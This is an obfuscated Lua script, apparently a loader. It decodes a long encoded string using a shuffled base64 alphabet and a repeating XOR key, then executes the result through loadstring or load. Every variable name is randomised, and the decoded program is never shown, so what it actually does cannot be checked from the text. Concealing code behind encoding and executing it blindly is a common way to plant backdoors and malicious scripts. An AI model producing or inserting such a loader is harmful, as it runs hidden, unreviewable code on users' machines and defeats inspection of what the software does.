return(function(...)
local _a6w1hgb2e=109
local _u321qs2ge=249*_a6w1hgb2e
local _qms17zfh7="yZL8ogdalW7U2AmVIQe5SxpD0q1z/N+BXbK3r6RFnYG4vP9hktisCJfcHEOuMTjw"
local _n7q6plyg2={249,93,145,119,60,84,80,18,12,182,127,33,62,111,87,232}
local _eghd9j6iw="F3FFoJCwl8CPr5gw/iHQG70anJrlA5Qk/1SLDJ0xUWRhxWYODLIc+psIdrgAgi9UOxd8qRyxo6xaPpnJq3v1PAq9PtnzBFPOW0T/QIxa+Mwd0ObDQsys/fBzgCP1y8Om4yhdWRHo8CJU4fCP7FxDTPPSKrX1xa/dlOPd2QgG12MMvJ9BK9m0nPI7FY3DY7k4plHtKTuiXTLv118L6W13od9pImzsrYV5crzPc/4XMiyvRoebEYBm3WYzb23g6uClz2MpEPKvPh+DUm1EhVa5/Raq01OVEV7KvIa5Cv9/cFWzT8szrju3YObwGm4kOvJs+NTqGjBgsE1DlV+juVad+P0THtCDW3AczAy1ISgA1AU/+uA/aaxiAL1+Skkxec8LuJVpaoopdrZ3fIQeBtSuOGX3s5godgZa8m/hpSkRlU12z+N4ALI3W51mS6Ag16mxtd1xzeqCBiyiJbojxxNqJmTYtDlNptQwyuYbU5Nv5OjXyGJUdRtF7e9AxtvUDah0U0MsiqKGcUpraTDtr7pHgIKb0v5W4O76fSOZsMiphZrjcRuCYNdLtTgOj0LiHP6FovEXYBKlrv510mDDuzLINpeMzYe2HjmkOapxiP7LkXx4j5a8FBVYEqSZkNGrkVZL1TAQiBK26ndp7h8Rf77qWiFcI/LOk2d7RRwd9OsMsa9x2wCNdXtf7L5UZJTD56Vaipi3VknLlcNfibNVSxySJjQ/tiqPgatlUhXkBFSFguabQ0C7Qs24qa3IZJPQgs1oM6pNqJXvAKEmTSbXgSNPk2tKPItZUCX7ZGWrA3JJ5VzUzT2Y+onMBtFx0evb1QBCjSfS1RZaSkvD9fkJU8nyFQps/Y8UY15MO63NsNmVhgCb9a+SuOei4zqar/ueXBA0NYJ8hz1NXT5p/44Hh7i/2f17eG3PrvF5XLLYT+mf3Lx7vsLZR1dXHGNdbPug6Bv+d4kXtTicPhBbpE7qJA1MSDwqDBKPCW5qrLcX4w94reH8iIcXHI=="
local _fo5ibgcj6={}
for _u9aafopoq=1,#_qms17zfh7 do _fo5ibgcj6[string.byte(_qms17zfh7,_u9aafopoq)]=_u9aafopoq-1 end
local _hqyky2am1={}
local _w85w8xieh,_o37zpsigc,_lwkv6rjfk=0,0,0
for _u9aafopoq=1,#_eghd9j6iw do
local _i3g2oqnjm=string.byte(_eghd9j6iw,_u9aafopoq)
local _ijbacgx8c=_fo5ibgcj6[_i3g2oqnjm]
if _ijbacgx8c then
_w85w8xieh=_w85w8xieh*64+_ijbacgx8c
_o37zpsigc=_o37zpsigc+6
if _o37zpsigc>=8 then
_o37zpsigc=_o37zpsigc-8
local _oe0mb3ydu=math.floor(_w85w8xieh/(2^_o37zpsigc))%256
_w85w8xieh=_w85w8xieh%(2^_o37zpsigc)
local _buarka09b=_n7q6plyg2[(_lwkv6rjfk%#_n7q6plyg2)+1]
_oe0mb3ydu=bit32.bxor(_oe0mb3ydu,_buarka09b)
_oe0mb3ydu=bit32.bxor(_oe0mb3ydu,_lwkv6rjfk%256)
_hqyky2am1[#_hqyky2am1+1]=string.char(_oe0mb3ydu)
_lwkv6rjfk=_lwkv6rjfk+1
end
end
end
local _pzypovwz4=table.concat(_hqyky2am1)
local _c1i3lojtc=loadstring or load
local _y3wh2k5bg=_c1i3lojtc(_pzypovwz4)
if _y3wh2k5bg then return _y3wh2k5bg(...) end
end)(...)